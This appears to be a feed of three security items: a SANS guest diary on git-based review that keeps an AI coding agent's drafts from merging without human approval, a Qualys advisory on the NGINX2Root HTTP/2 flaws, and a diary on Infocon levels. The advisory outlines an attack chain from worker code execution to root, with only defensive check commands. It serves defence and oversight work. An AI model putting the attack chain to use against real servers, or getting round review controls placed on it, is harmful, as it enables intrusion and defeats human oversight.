[This is a Guest Diary by Kevin Truong, an ISC intern as part of the SANS.edu BACS program]

Introduction
When conducting analysis of honeypot activity, it's easy for it to start as a pile of terminal output. The process is manual; screenshots of the terminal, plus a text file that gets edited in a common word processing application until it is "done". There is no say whether a certain number came from a certain query, what changed between drafts, or who decided to drop a caveat.


While hosting my own honeypot sensor, I wrote up three attacks:

  • An SSH brute force that logged in as mysql/mysql [1]
  • A bot looking for Telegram Desktop sessions and SMS modems [2]
  • A month of RedTail exploits against PHP plus one oversized multipart POST that matches the shape of PHP2Shell (CVE-2026-109618) [3].

Instead of a document folder though, I kept every report in a public git repository [4] and changed it only through pull requests. Supporting me in my analysis was an AI coding agent (Claude Code), which also drafted reports as a separate GitHub machine account. I wanted to give my Claude Code sessions a tangible identity in the code submission and review process, where a dedicated GitHub account could propose changes but never approve or merge them. 

Even though I drove every part of the analysis process, the code review of each pull request marked a deliberate step in my workflow which acted as both a gate and a spot-check of the content I was producing.

This diary describes that setup, what the git history shows about how well it worked, and what I would change.

Why Do It

The question this post answers are: can version control and a mandatory human review make AI-drafted security analysis trustworthy enough to publish?

It matters for three reasons:

  • Reproducibility. An indicator list or a timeline is only as good as the query behind it. If the query and its output are stored next to the claim, anyone can check it.
  • Public safety. Honeypot reports contain things that must not be published: the sensor's own address, its hostname, its cloud account, and sometimes attacker material such as private keys. Once something reaches a public git history, deleting the file does not remove it [4, SECURITY.md].
  • AI accountability. Language models are fluent and are confident; but fluency and confidence don't mean accuracy. If an AI is part of the workflow, there needs to be a record of what it wrote, what a human changed, and who approved it.

The Setup

The repository has one folder per attack. Each folder holds the summary, every piece of evidence it cites, and a hash list:

Every exhibit in a report's appendix shows the exact jq query that produced it, for example:

Before anything leaves the sensor, output is passed through a filter that replaces the sensor's address with <sensor-ip>, and then hashed. Anyone who clones the repository can confirm the evidence has not changed since it was committed:

The workflow around those files is shown in Figure 1.

The important pieces are:

  • A separate identity for the AI. Pull requests from the machine account are written by Claude Code sessions. It is a machine account I operate, and the README says so publicly [4].
  • The AI can write but not merge. A GitHub ruleset on main requires a pull request with one approval, blocks force-pushes and branch deletion and has no bypass actors. The AI account has written access, but GitHub does not let an author approve their own pull request, so it can never get a change into main alone.
  • A public-safety checklist on every PR. The pull request template asks the author to confirm that they read the full diff, that the secret scan is clean, that every IP and account is a placeholder (attacker indicators excepted), that there are no hostnames or local paths, and that attachments were checked by hand. The AI fills this in and I check it.
  • A secret scanner before every commit. A pre-commit hook runs gitleaks locally.

Options to Close Gaps

Comparing the ruleset with my own design notes [4, homelab/change-control.md] showed where the live settings fall short:

Fortunately, none of these needs’ new tools. These are repository settings and habits, which is the point. The controls that are deployed are the ones enforced by the server (GitHub), not ones written into a file the AI could edit on its own branch.

Who Benefits

  • Students and new analysts get a structure that forces each claim to point at evidence, and a history that shows a reviewer how their analysis improved. This works as a solo project, but the benefits grow exponentially with multiple analysts and reviewers.
  • Honeypot operators and DShield contributors can publish findings with less risk of leaking their sensor's identity, because the scrubbing and checklist happen before a merge, not after.
  • Teams adopting AI assistants get a pattern they can copy: a separate identity for the AI, server-side merge controls, and a checklist that the AI must fill in honestly. The record shows exactly where the AI's work ended and a human's began.
  • Readers of the reports can verify them. Every indicator traces to a query, and every query's output has a hash.

Conclusion

Version control is not new to security teams, where it's commonly seen in areas like detection rules and infrastructure code. That said though, treating something like honeypot/log analysis like code gave me reproducible evidence, a reviewable history, and a safe way to use an AI drafter: it proposed, I reviewed, and only I could merge. The history also kept me honest about the parts that did not work. Those gaps are visible because the work was in git, and each has a simple fix in the repository settings.

References

[1] Honeypot Attack Summary: SSH Brute Force from 77.239.124.204. https://github.com/kevtruo/security/tree/main/analysis/2026-10-18-ssh-brute-force-mysql-default-creds
[2] Honeypot Attack Summary: Telegram Session and SMS Modem Reconnaissance Bot. https://github.com/kevtruo/security/tree/main/analysis/2026-10-19-telegram-sms-recon-bot
[3] Honeypot Attack Summary: PHP Vulnerability Hunt, RedTail and a PHP2Shell-Pattern Request. https://github.com/kevtruo/security/tree/main/analysis/2026-10-03-php-vulnerability-hunt
[4] kevtruo/security repository (README, SECURITY.md, pull request template,homelab/change-control.md). https://github.com/kevtruo/security
[5] GitHub Docs, "About rulesets." https://docs.github.com/en/repositories/configuring-branches-and-merges-in-your-repository/managing-rulesets/about-rulesets
[6] GitHub Docs, "About push protection." https://docs.github.com/en/code-security/secret-scanning/introduction/about-push-protection
[7] gitleaks. https://github.com/gitleaks/gitleaks
[8] Claude Code GitHub Actions documentation. https://docs.anthropic.com/en/docs/claude-code/github-action
[9] https://www.sans.edu/cyber-security-programs/bachelors-degree/

-----------
Guy Bruneau IPSS Inc.

gbruneau at isc dot sans dot edu

item.title: NGINX2Root: Five nginx Flaws, Led by CVE-2026-123007. How to Find, Mitigate, and Patch Now
item.description: Executive Summary NGINX2Root is a set of five nginx vulnerabilities disclosed on November 18, 2026. The lead flaw, CVE-2026-123007, is a memory corruption bug in the way nginx handles HTTP/2 connections. F5, which maintains nginx, rates it 9.2 under CVSS v4.0 and 8.1 under CVSS v3.1. An attacker with no credentials can crash nginx worker […]
item.content:encoded:
Executive Summary

NGINX2Root is a set of five nginx vulnerabilities disclosed on November 18, 2026. The lead flaw, CVE-2026-123007, is a memory corruption bug in the way nginx handles HTTP/2 connections. F5, which maintains nginx, rates it 9.2 under CVSS v4.0 and 8.1 under CVSS v3.1. An attacker with no credentials can crash nginx worker processes, and researchers have demonstrated remote code execution with the privileges of the nginx worker. Where the worker runs without root privileges, an attacker would need an additional escalation path to gain root. This could involve chaining the NGINX vulnerability with a suitable local privilege-escalation flaw. Unpatched builds of NGINX Open Source from 1.9.5 through 1.31.8, and unpatched NGINX Plus builds, are in scope when HTTP/2 is enabled. Fixes shipped in NGINX Open Source 1.30.7 and 1.31.9, and turning off HTTP/2 closes this exposure where patching has to wait. A separate Linux kernel flaw that the researchers used to go from the worker account to root has no patch yet. Start with internet-facing nginx servers that accept HTTP/2, and assign an owner and a deadline to every system still unpatched.

What’s at Risk

A Flaw in nginx Could Hand Attackers the Front Door to Your Applications. nginx is often the first system a web request reaches. It runs as a web server, a reverse proxy (a server that passes requests to the applications behind it), a load balancer, and the entry point to Kubernetes clusters. CVE-2026-123007 is in nginx’s own HTTP/2 code, so no application behind it has to be at fault.

HTTP/2 lets a client tell the server how much data it is allowed to send. nginx can lose count of that allowance when a client cancels requests at the right moment. The bad count later makes nginx copy memory it should not touch.

F5 says the result is typically a crash of the nginx worker, the process that handles live traffic. F5 also says code execution is possible where ASLR, the memory-address randomization that makes exploits harder, is disabled or bypassed. Xint, the team that named NGINX2Root, reports doing exactly that: it leaked memory addresses and then ran commands as the nginx worker over a public HTTPS port.

In Qualys TRU’s assessment, three outcomes matter to the business:

  • Exposure of traffic and keys. Code running in the worker can read requests and responses after nginx decrypts them, including passwords and session tokens. It may also expose TLS private keys that are held in software and accessible to the worker.
  • A foothold behind the perimeter. Backend systems usually trust the proxy in front of them. An attacker on that proxy starts from a trusted position.
  • Outages. A failed attempt can still crash workers and drop connections.

Workers normally run under a restricted account. An attacker gets whatever privileges the worker actually has, so if it already runs as root, no further escalation is needed in that environment. Where it does not, the researchers chained a separate flaw in the Linux kernel’s SCTP code to get root. SCTP is a network protocol, like TCP, that the kernel supports. They report root on the host, including from nginx running inside a Docker container. That kernel flaw has no CVE and no patch yet, so patching nginx removes the remote entry point but not the step to root.

NGINX2Root covers four more nginx flaws. F5 scores all five 9.2 under CVSS v4.0 and 8.1 under CVSS v3.1, and the same nginx releases fix them. Each needs a different configuration:

The rest of this post focuses on CVE-2026-123007, the flaw with the widest reach.

Why NGINX2Root Is Also an Application Security Problem 

NGINX2Root is an infrastructure flaw, but its impact lands on the applications behind nginx. Where nginx terminates TLS and proxies requests, every login, API call, and session cookie bound for those applications passes through the worker process in clear text. An attacker running code in that worker sits between users and the applications they trust: 

  • Credentials and tokens become reusable. Passwords, session cookies, API keys, and bearer tokens read from the worker can be replayed directly against the applications and APIs behind the proxy, where they look like legitimate user traffic. 
  • Trust placed in the proxy becomes the attacker’s. Backend services, internal APIs, and admin interfaces are often reachable only from the proxy. Applications that accept identity or client details from headers the proxy sets, such as X-Forwarded-For or user headers added after single sign-on, trust whatever the compromised proxy sends. 
  • Application traffic can be altered in transit. Requests and responses pass through the worker, so the attacker is positioned to change what users receive and what the backend processes, with no change to application code. 
  • One proxy, many applications. A shared reverse proxy or Kubernetes ingress controller often fronts dozens of applications owned by different teams. A worker crash takes all of them offline at once. 

For application security teams, the scoping question is not only which hosts run a vulnerable nginx build, but which applications and APIs depend on them, what data those applications handle, and who owns them. 

Are You Affected?

A system is in scope only when both conditions are true. For an attack to work, the attacker must also be able to open an HTTP/2 connection to nginx itself.

F5 notes that it did not evaluate versions past End of Technical Support. F5 also lists BIG-IP, BIG-IQ, and F5OS as not vulnerable in its advisory.

The checks below come from the researchers’ write-up. Run them on the nginx host. The first shows whether the build includes HTTP/2. The second shows whether the configuration turns it on.

nginx -V 2>&1 | grep -o — ‘–with-http_v2_module’

sudo nginx -T 2>&1 | sed ‘s/#.*//’ | grep -nE ‘listen[[:space:]].*http2|^[[:space:]]*http2[[:space:]]+on[[:space:]]*;’

Run this one from outside your network. ALPN protocol: h2 means the server accepts HTTP/2 from the internet.

openssl s_client -connect HOST:443 -servername HOST -alpn h2 </dev/null 2>&1 | grep -E ‘ALPN protocol:|No ALPN negotiated’

nginx also ships inside other software. Status as of November 18, 2026:

Three cautions when scoping:

  • Do not rely on nginx -v alone. Distributions often fix a flaw without changing the nginx version number. Compare the full package version with the distribution’s advisory.
  • Check where the HTTP/2 connection ends. If a CDN or load balancer handles HTTP/2 in front of nginx, an outside test only reaches that device. Test the nginx port directly.
  • Use internet exposure to order the work, not to close findings. An internal nginx with HTTP/2 on is still reachable by an attacker who is already inside the network.

Exploitation Status

As of November 18, 2026, we have not seen public confirmation of exploitation in the wild.

Working exploit code is public. The team behind NGINX2Root also reports its own exploit working over public IP addresses on AWS, GCP, and Azure, and is holding back the final steps.

The public exploit is hard to use. It sends a very large number of HTTP/2 control messages over one long-lived connection for several minutes, has to reach nginx directly, and depends on a specific memory-copy routine in the standard Linux C library on 64-bit Intel and AMD processors.

These limits slow mass exploitation. In Qualys TRU’s assessment, they do not protect a specific internet-facing server from a capable attacker, and other techniques may follow.

What to Do Now

Updating nginx is the only complete fix. F5 released fixed builds on November 18, 2026.

Linux distributions publish on their own schedules. As of November 18, 2026, Ubuntu and Debian had not shipped fixed packages. Use your vendor’s advisory to identify the fixed package and confirm it addresses CVE-2026-123007.

Restart nginx after you update. A reload applies configuration changes but keeps the old program running, so the flaw stays in memory until a restart.

If you cannot patch today, turn off HTTP/2 on every affected listener. F5 states the flaw affects only configurations that use HTTP/2, and the researchers recommend this as a temporary measure. For the exact steps, see nginx’s documentation for the http2 directive, CERT-EU’s advisory, and section 3.3 of the researchers’ write-up. Clients fall back to HTTP/1.1. Services that need HTTP/2, such as gRPC, will stop working, so test first. This covers CVE-2026-123007 and CVE-2026-123633 only, and it does not replace the patch.

Advice for Risk and Vulnerability Management Teams

Qualys TRU’s advice for the teams running this response:

  • Do not let the score set the deadline: Under CVSS v3.1 this flaw is 8.1, which many remediation policies file as High. Public exploit code and a server that faces the internet matter more than the number. Handle vulnerable nginx deployments with externally reachable HTTP/2 as an emergency.
  • Close findings on evidence: A server is done when the fixed build is installed, nginx has been restarted, and the vendor’s advisory confirms the package covers all five CVEs. Report patched, temporarily mitigated, not exposed by configuration, and unknown as separate states, and do not count unknown as safe.
  • Fix the template as well as the server: Update container images, Helm charts, machine images, and autoscaling templates. Otherwise the next scale-out or failover brings the vulnerable build back.
  • Map each nginx instance to the applications and APIs behind it. A host inventory shows where a vulnerable build is installed; it does not show which applications, owners, and data depend on it. Use that mapping to set priority and to notify application owners, not to close findings. 
  • Put an end date on every workaround: Turning off HTTP/2 covers two of the five flaws, and the next configuration push can undo it. Record who owns each exception and when it ends.
  • Decide what to do with nginx that will not get a fix: The community ingress-nginx project is archived, and the older NGINX Plus R-series branches have no fixed build listed, although fixed NGINX Plus 37.x releases exist. These need a migration plan or a signed risk acceptance.
  • Treat privilege escalation flaws as part of this response: Where the worker runs without root privileges, an attacker would need an additional escalation path to gain root. The newly disclosed SCTP flaw is one such path, and any other local privilege-escalation flaw that can be exploited from the worker’s context could serve the same purpose. Patch known local privilege-escalation flaws on nginx hosts, in the kernel and elsewhere, with the same urgency. A current kernel does not mean the SCTP flaw is fixed, because that flaw has no patch yet.

How Qualys Can Help

Inventory nginx Installations with Qualys CSAM

Qualys CyberSecurity Asset Management (CSAM) lists every asset with nginx installed, along with the version of each installation, so teams can quickly scope NGINX2Root remediation. Because NGINX Open Source 1.9.5 through 1.31.8 is affected, the version tells you which installations are in range. It does not tell you whether HTTP/2 is turned on or whether a Linux distribution has backported the fix, so check those separately. nginx bundled in containers, Kubernetes ingress controllers, and appliances may not appear in a standard inventory, so check those separately too.

Assets With nginx in the Affected Range

Use the following CSAM query to identify potentially affected NGINX Open Source installations on the stable, mainline, and older branches for further assessment. It uses two ranges because 1.31.0 through 1.31.8 are affected even though they are higher than the fixed 1.30.7.

software:(name:”nginx” AND ( (version>=1.9.5 AND version<1.30.7) OR (version>=1.31.0 AND version<1.31.9) ))

Detect NGINX2Root at Disclosure with Qualys InstaScan 

NGINX2Root will not be patched everywhere at once. On November 18, F5 shipped NGINX Open Source 1.30.7 and 1.31.9, fixed NGINX Plus 37.x builds, and updated releases of NGINX Ingress Controller and NGINX Gateway Fabric, and the official Docker image now carries fixed tags. Older NGINX Plus R-series branches have no fixed build listed, and Ubuntu and Debian still list their stable nginx packages as vulnerable. n, powered by Agent Insta, keeps detection from waiting on any of those schedules. It checks every new vendor advisory against the software inventory Qualys already has for your assets, whether that inventory came from Qualys Cloud Agents, Qualys scanners, or third-party tools you have connected.   

For assets in your InstaScan scope, vulnerable nginx installations show up as CVE-2026-123007 findings in Qualys ETM, typically within minutes of the advisory, with no scan to schedule. That gives your team owners and deadlines to work with before the VMDR detection QIDs below are released. Because InstaScan matches on the installed nginx version, it cannot see whether HTTP/2 is turned on or whether a distribution has backported the fix. Use the checks in Are You Affected? to decide which findings to work first, and close them only on the evidence described above.  

Where to find InstaScan findings. CVE-2026-123007 findings land in Qualys ETM under Risk Management → Findings → InstaScan, a tab that holds only the last 48 hours or so of InstaScan detections. After that they move to the Vulnerabilities tab. When a Cloud Agent or scanner later detects the same CVE on the same asset, the two detections are merged into one record rather than duplicated. To pull InstaScan findings back up in the Vulnerabilities tab, search for finding.isInstaScan: TRUE, click the InstaScan summary card, or look for the InstaScan badge in the Sources column. 

Identify Applications Potentially Impacted by NGINX2Root with Qualys TotalAppSec 

CSAM and VMDR show where vulnerable nginx is installed. TotalAppSec answers the question application security teams need answered next: which web applications and APIs are served through it, and who owns them. 

Discover the full application attack surface. TotalAppSec continuously discovers web applications and APIs across internet-facing and internal environments, on premises and in the cloud, including unknown, forgotten, shadow, and rogue applications. It builds a unified inventory by integrating with Qualys EASM and CSAM and with API sources such as Postman and MuleSoft.  

Detect vulnerable nginx in front of your applications. TotalAppSec includes the following detections for the five NGINX2Root CVEs: 

These QIDs are version-based: they report that the nginx version identified for the target application falls in an affected range.  A detection marks an application for investigation

item.title: Java4Shell, NGINX2Shell and more: Why we are not at "Yellow", (Wed, Nov 18th)
item.description: About a month ago, we went to Infocon Yellow for the first time in a few years. We decided to address the php2shell vulnerability and alert our readers to its significant impact. Following php2shell, we had a number of vulnerabilities and events that may also have scored high enough to trigger an Infocon "Yellow" [infocon]. In the last few days, we had a major Microsoft 365 outage, a critical vulnerability in Java, and a critical vulnerability in NGINX, which was disclosed today.
item.content:encoded:
About a month ago, we went to Infocon Yellow for the first time in a few years. We decided to address the php2shell vulnerability and alert our readers to its significant impact. Following php2shell, we had a number of vulnerabilities and events that may also have scored high enough to trigger an Infocon "Yellow" [infocon]. In the last few days, we had a major Microsoft 365 outage, a critical vulnerability in Java, and a critical vulnerability in NGINX, which was disclosed today.

My plan today was to write a bit about attacks we are seeing against one of our Java-specific honeypots. But the results can be summarized in one sentence: We are seeing many attacks, but none that exploit Java4Shell (yet). Will it be an important issue? Probably. Should you patch? Sure. Will the world as we know it end? Maybe. 

So why not go to "Yellow"? This is not a new question. Often people ask why we are on "Green" if they are seeing hundreds or thousands of attacks hitting their system each day. The Internet is a dangerous place. Shouldn't we be on "Yellow" (or "Orange") to reflect that danger? My answer has been: "Green" means the Internet is broken as usual. As long as the status is "Green", you should expect a normal "9-to-5" day. I have heard from organizations that have used our infocon to justify staffing and overtime, and I am well aware of the impact it may have.

The reason behind our conservative Infocon is that you can't be alert and "on guard" all the time. An alert status that is "high" all the time is meaningless and counterproductive. You must not treat these recent vulnerabilities as "emergencies". They are the "new normal". Treat them as such. You will not be able to patch nginx2shell across a large organization before the exploit is released. Instead of trying to do the impossible and fail, think beyond the vulnerability of the day. A new reality requires new procedures and techniques. Here are a few ideas:

  • Automate patching as much as possible, in particular for less critical systems. Traditionally, automatic patching had two significant drawbacks. First, you may crash a system because of a failed patch. Secondly, the patch may not be applied correctly, and you treat a vulnerable system as "patched".
    Select less critical systems that would be at the end of your patch priority list. I'd rather take a system down myself than have ransomware do it for me. Having a system possibly patched is better than being sure the system isn't patched. And of course, there should be some testing, but that can wait a bit longer. This responds well to the faster development of exploits.
  • Reduce your exposure. This should have been a priority years ago. But there are still too many systems connected to the internet that shouldn't be connected. Build a defensible architecture. The same is true for individual applications: reduce the "blast radius" by restricting which data and resources each application can access. And reduce your supply chain exposure. Do you get enough value from tools like Optimizely to justify the risk of them compromising your application?
  • Avoid chasing squirrels. Do not change your plan and drop what you are doing just because the world is going to end. The world may end, in which case, patching one more system is probably not going to make a difference. Whether the world ends or not, at least you will be well-rested to deal with it.

During my classes, I am exposed to security professionals from a wide range of backgrounds, working in different industries and countries worldwide. The one thing they all have in common is that they do not have enough time, tools, and sometimes skills to do their job. Making the job you can't do right now any more urgent won't help. Work on tooling and resources, and develop a plan for applying best practices at a sustainable pace. Embrace AI tooling. It is immensely useful for automation. It is even more amazing at helping you get organized. Many partitioners are afraid that AI will do more harm than good, and they are not wrong. But use it where it helps you most. Are you great at writing little scripts but horrible at tracking and inventorying them? Give AI the job you suck at and develop a rapport with your tools. But embracing automation does include embracing AI tooling.

Finally, I got a lot of positive feedback on the final "conclusion" of yesterday's podcast, so I am going to link to it directly here:

 

 

[php2shell] https://isc.sans.edu/diary/33440
[infocon] https://isc.sans.edu/infocon.html

--
Johannes B. Ullrich, Ph.D. , Dean of Research, SANS.edu
Twitter|
